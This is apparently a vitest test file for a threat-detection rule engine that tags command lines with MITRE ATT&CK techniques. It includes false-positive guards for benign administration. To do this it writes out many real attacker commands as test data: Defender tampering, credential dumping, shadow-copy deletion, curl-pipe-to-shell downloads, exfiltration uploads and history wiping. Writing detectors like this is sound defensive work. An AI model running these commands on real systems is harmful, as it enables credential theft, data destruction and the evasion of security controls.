import { describe, it, expect } from "vitest";
import { tradecraftSignal } from "../../src/analysis/tradecraftRules.js";
import { reconTechniques } from "../../src/analysis/reconTechniques.js";

// Each case is a real (or representative) command line drawn from the DFIR Report corpus.
const sig = (cmd: string, image = "") => tradecraftSignal(image, cmd);

describe("tradecraftRules — strong (High) attacker tradecraft", () => {
  it("flags Microsoft Defender tampering as T1562.001", () => {
    for (const cmd of [
      "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
      "Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob",
      'Add-MpPreference -ExclusionPath "C:\\Windows\\Temp"',
      "powershell.exe Uninstall-WindowsFeature -Name Windows-Defender-GUI",
      "net stop WinDefend",
      'REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
    ]) {
      const r = sig(cmd);
      expect(r?.weight, cmd).toBe("strong");
      expect(r?.mitre, cmd).toContain("T1562.001");
    }
  });

  it("flags BYOVD AV-killer drivers", () => {
    expect(sig("", "C:\\Windows\\Temp\\rwdrv.sys")?.weight).toBe("strong");
    expect(sig("", "C:\\Users\\Public\\hlpdrv.sys")?.mitre).toContain("T1562.001");
    expect(sig("WinRing0x64.sys", "")?.weight).toBe("strong");
  });

  it("flags LSA / UAC policy tampering with the right technique", () => {
    expect(sig("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f")?.mitre).toContain("T1562.001");
    expect(sig("reg add ...WDigest /v UseLogonCredential /t REG_DWORD /d 1")?.mitre).toContain("T1003.001");
    expect(sig("reg add ...System /v EnableLUA /t REG_DWORD /d 0 /f")?.mitre).toContain("T1548.002");
    expect(sig("reg add hkcu\\software\\classes\\ms-settings\\shell\\open\\command")?.mitre).toContain("T1548.002");
  });

  it("flags credential dumping beyond isSuspiciousCmd's coverage", () => {
    expect(sig('mimikatz "lsadump::dcsync /domain:corp /user:admin"')?.mitre).toContain("T1003.006");
    expect(sig("secretsdump.py corp/admin@10.0.0.1")?.mitre).toContain("T1003.006");
    expect(sig("nxc smb 10.0.0.1 -u u -p p --ntds")?.mitre).toContain("T1003");
    expect(sig("nxc smb 10.0.0.1 -u u -p p -M lsassy")?.mitre).toContain("T1003");
    expect(sig("reg.exe save hklm\\security c:\\ProgramData\\security.save")?.mitre).toContain("T1003.002");
    expect(sig("reg.exe save hklm\\system c:\\ProgramData\\system.save")?.mitre).toContain("T1003.002");
    expect(sig('psql.exe -U postgres --csv -d VeeamBackup -w -c "SELECT user_name,password FROM credentials"')?.mitre).toContain("T1555");
    expect(sig("Rubeus.exe kerberoast")?.mitre).toContain("T1558.003");
    expect(sig('New-MailboxExportRequest -Mailbox "admin" -FilePath "\\\\srv\\c$\\x.aspx"')?.mitre).toContain("T1114.002");
    expect(sig("lazagne.exe all")?.mitre).toContain("T1555");
  });

  it("flags recovery inhibition (T1490) — incl. the vssadmin.exe form STRONG_CMD missed", () => {
    // vssadmin.exe delete shadows — the `.exe` form STRONG_CMD's `vssadmin\s+delete` did not match.
    const v = sig("vssadmin.exe delete shadows /all /quiet");
    expect(v?.weight).toBe("strong");
    expect(v?.mitre).toContain("T1490");
    expect(sig("C:\\Windows\\System32\\vssadmin.exe delete shadows /all /quiet")?.mitre).toContain("T1490");
    expect(sig("wmic shadowcopy delete /all")?.mitre).toContain("T1490");
    expect(sig('powershell "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"')?.mitre).toContain("T1490");
    expect(sig("bcdedit /set {default} recoveryenabled No")?.mitre).toContain("T1490");
    expect(sig("bcdedit /set {default} bootstatuspolicy ignoreallfailures")?.mitre).toContain("T1490");
    expect(sig("bcdedit /set {default} safeboot network")?.mitre).toContain("T1490");
    expect(sig("wbadmin delete systemstatebackup -keepVersions:0")?.mitre).toContain("T1490");
    expect(sig("Get-VM | where { $_.Name -ne 'VM01' } | Stop-VM -Force")?.mitre).toContain("T1490");
  });

  it("flags ransomware encryptor invocation (T1486) without colliding with PowerShell -enc", () => {
    expect(sig("C:\\ProgramData\\msidxsvc.exe --enc --path D:\\ClientData")?.mitre).toContain("T1486");
    expect(sig("locker.exe -p=G:\\ -n=15")?.mitre).toContain("T1486");
    expect(sig("win.exe -n=2 netonly")?.mitre).toContain("T1486");
    // single-dash -enc is PowerShell EncodedCommand, NOT a ransomware flag — must not be T1486
    expect(sig("powershell.exe -nop -enc SQBFAFgA")?.mitre ?? []).not.toContain("T1486");
  });

  it("flags tunneling, Impacket lateral movement and cloud exfil", () => {
    expect(sig("ssh root@193.242.184.150 -R *:10400 -p22")?.mitre).toContain("T1572");
    expect(sig("plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389 1.2.3.4 -P 22 -no-antispoof")?.mitre).toContain("T1572");
    expect(sig("ssh -N -D 1080 user@host")?.mitre).toContain("T1090");
    expect(sig("wmic /node:10.0.0.5 process call create 'cmd.exe /c x.bat'")?.mitre).toContain("T1047");
    expect(sig("cmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\__1700000000 2>&1")?.mitre).toContain("T1047");
    expect(sig('rclone.exe copy "\\\\SRV\\Shares" mega:DATA -q --ignore-existing')?.mitre).toContain("T1567.002");
    expect(sig("restic.exe -r rest:http://1.2.3.4:8000/ backup C:\\data")?.mitre).toContain("T1567.002");
  });

  it("flags web-client file upload as exfiltration (T1041) but not a plain download", () => {
    expect(sig("powershell.exe -nop -w hidden -c Invoke-RestMethod -Uri https://mft.brightparcel.io/u/inbox -Method Put -InFile C:\\Windows\\Temp\\rb.zip")?.mitre).toContain("T1041");
    expect(sig("iwr -Uri https://x.tld/api -Method Post -Body $json")?.mitre).toContain("T1041");
    expect(sig("curl -T loot.zip https://x.tld/upload")?.mitre).toContain("T1041");
    // plain download / GET must NOT be graded as exfil
    expect(sig("Invoke-RestMethod -Uri https://api.internal/status")?.mitre ?? []).not.toContain("T1041");
    expect(sig("iwr https://example.com/tool.exe -OutFile tool.exe")?.mitre ?? []).not.toContain("T1041");
  });

  it("flags ANY robocopy/xcopy invocation as strong T1074.001, even routine-looking backup usage", () => {
    // The real halcyon-insider-usb exfil staging — must be strong.
    expect(sig("Robocopy.exe \\\\FS-01\\Engineering\\Projects\\TX-940 C:\\Windows\\Temp\\dfsr_stage\\TX-940 /E /Z /R:1 /W:1 /NP")?.weight).toBe("strong");
    expect(sig("xcopy.exe C:\\Windows\\Temp\\dfsr_stage\\q2_rollup.7z E:\\ /Y")?.mitre).toContain("T1074.001");
    // A routine-looking SYSTEM/admin backup job — deliberately ALSO strong (no argument distinguishes
    // it from theft); the analyst is expected to suppress recurring legitimate use via false-positive
    // marking + "mark similar" instead of the rule guessing intent from arguments.
    expect(sig("Robocopy.exe D:\\Shares\\Engineering D:\\VeeamRepo\\Engineering /MIR /R:1 /W:1")?.weight).toBe("strong");
    expect(sig('xcopy.exe "C:\\Users\\helen.osei\\Documents\\Board\\Q2-Review.pptx" E:\\ /Y')?.mitre).toContain("T1074.001");
    // Bare image name alone (no arguments) still flags.
    expect(sig("", "C:\\Windows\\System32\\Robocopy.exe")?.weight).toBe("strong");
    expect(sig("C:\\Windows\\System32\\xcopy.exe", "")?.weight).toBe("strong");
  });

  it("flags AnyDesk/RustDesk unattended setup as strong, bare presence as weak", () => {
    expect(sig("anydesk.exe --install C:\\ProgramData\\AnyDesk --start-with-win --silent")?.weight).toBe("strong");
    expect(sig("echo pw | anydesk.exe --set-password")?.weight).toBe("strong");
    const bare = sig("C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe");
    expect(bare?.weight).toBe("weak");
    expect(bare?.mitre).toContain("T1219");
  });
});

describe("tradecraftRules — Huntress Rapid Response corpus additions", () => {
  it("flags registry-based Defender/firewall service disable (Start=4), distinct from net/sc stop", () => {
    expect(sig('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\mpssvc" /v Start /t REG_DWORD /d 4 /f')?.mitre).toContain("T1562.001");
    expect(sig("SystemSettingsAdminFlows.exe Defender DisableEnhancedNotifications 1")?.mitre).toContain("T1562.001");
  });

  it("flags msiexec remote silent install and curl|bash fetch-execute", () => {
    const r = sig("cmd.exe /c msiexec /q /i http://4.216.93.211:5981/RuntimeBroker.msi");
    expect(r?.weight).toBe("strong");
    expect(r?.mitre).toEqual(expect.arrayContaining(["T1105", "T1218.007"]));
    expect(sig("curl -s hxxp://keep.camdvr.org:8000/d5.sh | bash")?.mitre).toEqual(expect.arrayContaining(["T1105", "T1059.004"]));
    expect(sig("wget -qO- http://x.tld/i.sh | sudo sh")?.mitre).toContain("T1105");
  });

  it("flags NTDS.dit exfil via wbadmin backup and manual browser-credential-file copy", () => {
    expect(sig("wbadmin.exe start backup -backuptarget:\\\\127.0.0.1\\C$\\ProgramData\\ -include:C:\\windows\\NTDS\\ntds.dit -quiet")?.mitre).toContain("T1003.003");
    expect(sig('copy "C:\\Users\\bob\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data" C:\\Windows\\Temp\\')?.mitre).toContain("T1555.003");
  });

  it("flags persistence: malicious sc-created service, hidden account, privileged-group add, chattr +i, bulk EventLog wipe", () => {
    expect(sig('sc create windowDefenSrv binPath= "c:\\users\\public\\86.dat windowDefenSrv" start= auto')?.mitre).toContain("T1543.003");
    expect(sig('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v backup_da /d 0 /f')?.mitre).toContain("T1564.002");
    expect(sig('net group "Domain Admins" azuresync /add')?.mitre).toContain("T1098.007");
    expect(sig('net localgroup Administrators evilacct /add')?.mitre).toContain("T1098.007");
    expect(sig("chattr +i /usr/bin/sshd-agent")?.mitre).toContain("T1222.002");
    expect(sig('powershell.exe [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName)')?.mitre).toContain("T1070.001");
  });

  it("flags the QEMU SSH-backdoor persistence/tunnel primitive", () => {
    expect(sig("qemu-system-x86_64.exe -m 512 -nic user,hostfwd=tcp::22022-:22")?.mitre).toContain("T1572");
  });

  it("flags OOB-callback / BitTorrent-DHT / Cloudflare-Workers infrastructure as weak C2", () => {
    expect(sig("iwr -Uri http://webhook.site/abc123 -Body $r -Method Put")?.mitre).toContain("T1071.001");
    expect(sig("powershell Invoke-WebRequest -Uri http://x.oastify.com/y")?.mitre).toContain("T1071.001");
    expect(sig("auth.qgtxtebl.workers.dev")?.mitre).toContain("T1572");
    expect(sig("connecting to router.bittorrent.com for DHT bootstrap")?.mitre).toContain("T1090");
  });

  it("flags Elastic-Cloud-ingest exfil and InternetExplorer.Application COM proxy execution", () => {
    expect(sig("Invoke-RestMethod -Uri https://my-deployment.es.us-east-1.aws.elastic-cloud.com:9243/_bulk -Method Post -Body $data")?.mitre).toContain("T1041");
    expect(sig('$ie = New-Object -ComObject "InternetExplorer.Application"')?.mitre).toContain("T1559.001");
  });

  it("folds Akira's -dellog flag into the ransomware-encryptor rule", () => {
    expect(sig("w.exe -n=3 -p=X:\\ -dellog")?.mitre).toContain("T1486");
  });
});

describe("tradecraftRules — weak (Medium) dual-use tooling", () => {
  it("grades RMM, C2-framework names, ngrok/cloudflared as weak", () => {
    expect(sig("C:\\Windows\\Temp\\SplashtopStreamer3500.exe")?.weight).toBe("weak");
    expect(sig("netsupport client32.ini")?.mitre).toContain("T1219");
    expect(sig("ngrok tcp 3389")?.mitre).toContain("T1572");
    expect(sig("cloudflared.exe tunnel run")?.mitre).toContain("T1572");
    expect(sig("rundll32 C:\\PerfLogs\\beacon64.dll, StartW # cobalt strike")?.weight).toBe("weak");
    expect(sig("certipy find -u user@corp -p pw")?.mitre).toContain("T1068");
  });
});

describe("tradecraftRules — false-positive guards (must NOT flag benign admin activity)", () => {
  it("does not flag routine commands", () => {
    for (const cmd of [
      "ipconfig /all",
      "net stop spooler",
      "net stop wuauserv",
      "ssh admin@jumpbox",                       // plain SSH login, no -R/-D
      "scp file.txt user@host:/tmp/",
      "C:\\Program Files\\PostgreSQL\\15\\bin\\psql.exe -U app -d appdb -c 'SELECT * FROM orders'",
      "rclone version",                          // no copy/sync/remote
      "reg save HKLM\\SOFTWARE backup.hiv",       // SOFTWARE hive, not SAM/SECURITY/SYSTEM
      "powershell Get-MpComputerStatus",          // AV status read (discovery, not disable)
      "wbadmin start backup -backuptarget:E:",    // legitimate backup
      "sc query WinDefend",                       // status query, not stop/config
      "bcdedit /enum",
      "tar -czf backup.tgz /data",
      "msiexec /i C:\\Installers\\app.msi /qn",          // local install, no remote URL
      "curl -s https://example.com/README.md",           // plain fetch, no pipe-to-shell
      "sc create MyLegitSvc binPath= \"C:\\Program Files\\App\\svc.exe\"", // not staged in a user-writable dir
      "net localgroup Backup-Operators bob /add",        // not a privileged group
      "reg add HKLM\\SOFTWARE\\Contoso\\App /v Setting /d 1 /f",
      "chmod 750 /usr/bin/sshd-agent",                    // permission change, not immutable flag
      "Get-WinEvent -LogName Security -MaxEvents 10",     // reading logs, not clearing them
      "qemu-system-x86_64.exe -m 2048 -hda disk.img",     // normal VM boot, no hostfwd backdoor
      "Invoke-RestMethod -Uri https://api.contoso.com/status", // plain API GET, not upload/exfil
    ]) {
      expect(sig(cmd), cmd).toBeNull();
    }
  });
});

describe("reconTechniques — new discovery patterns from the corpus", () => {
  it("tags domain-trust, AD-recon tooling, scanners, AV and share discovery", () => {
    expect(reconTechniques("nltest.exe", "nltest /domain_trusts /all_trusts")).toContain("T1482");
    expect(reconTechniques("af.exe", "af.exe -gcb -sc trustdmp")).toEqual(expect.arrayContaining(["T1482", "T1087.002"]));
    expect(reconTechniques("sharphound.exe", "sharphound.exe -c all")).toContain("T1087.002");
    expect(reconTechniques("netscan.exe", "netscan.exe /range")).toContain("T1046");
    expect(reconTechniques("wmic.exe", "WMIC /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName")).toContain("T1518.001");
    expect(reconTechniques("powershell.exe", "Invoke-ShareFinder -CheckShareAccess")).toContain("T1135");
  });
});

// ─────────────────────── Linux / Unix tradecraft ───────────────────────
// Gap found on the EvidenceForge veridia-breach benchmark: the whole DB-01 half of the intrusion
// (read .env → mysqldump → gzip staging → curl exfil → truncate bash_history) graded Info via the
// ECAR path and was demoted to the analyst-only super-timeline, i.e. invisible to AI synthesis.
// bashHistoryImport's own CMD_RULES already graded these Medium, so the SAME command scored
// differently depending on which importer saw it. These rules close that divergence.
describe("tradecraftRules — Linux/Unix attacker tradecraft", () => {
  it("flags bulk database dumps as collection (T1005)", () => {
    for (const cmd of [
      "mysqldump -u veridia_app -pveridia-db-p455 veridia_prod customers payment_methods > /tmp/export-4291.sql",
      "mysqldump",
      "pg_dump -Fc appdb > /tmp/app.dump",
      "pg_dumpall -U postgres",
      "mongodump --db prod --out /tmp/m",
    ]) {
      const r = sig(cmd);
      expect(r, cmd).not.toBeNull();
      expect(r?.mitre, cmd).toContain("T1005");
    }
  });

  it("flags shell-history destruction as indicator removal (T1070.003)", () => {
    for (const cmd of [
      "truncate -s 0 ~/.bash_history",
      "rm -f ~/.bash_history",
      "cat /dev/null > ~/.bash_history",
      "> /home/deploy/.bash_history",
      "history -c",
      "unset HISTFILE",
      "ln -s /dev/null ~/.bash_history",
    ]) {
      const r = sig(cmd);
      expect(r?.weight, cmd).toBe("strong");
      expect(r?.mitre, cmd).toContain("T1070.003");
    }
  });

  it("flags reads of credential-bearing files as unsecured credentials (T1552.001)", () => {
    for (const cmd of [
      "cat /opt/veridia-app/.env",
      "less /srv/app/.env",
      "cat /home/devuser/.ssh/id_rsa",
      "cat ~/.my.cnf",
      "cat ~/.aws/credentials",
      "cat /home/deploy/.pgpass",
    ]) {
      const r = sig(cmd);
      expect(r, cmd).not.toBeNull();
      expect(r?.mitre, cmd).toContain("T1552.001");
    }
  });

  it("flags archiving of a database dump or /tmp staging path (T1560.001)", () => {
    for (const cmd of [
      "gzip -9 /tmp/export-4291.sql",
      "tar czf /tmp/out.tar.gz /tmp/export-4291.sql",
      "zip -r /tmp/data.zip /tmp/dump",
      "xz /tmp/export.sql",
    ]) {
      const r = sig(cmd);
      expect(r, cmd).not.toBeNull();
      expect(r?.mitre, cmd).toContain("T1560.001");
    }
  });

  it("does not fire on ordinary Linux administration", () => {
    for (const cmd of [
      "ls -la /var/backups/",
      "uname -a",
      "id",
      "hostname -f",
      "systemctl status nginx",
      "gzip /var/log/nginx/access.log.1",          // log rotation, not staging
      "tar czf /backups/etc-$(date +%F).tar.gz /etc",
      "cat /etc/hostname",
      "vim /opt/app/config.yaml",
    ]) {
      expect(sig(cmd), cmd).toBeNull();
    }
  });
});
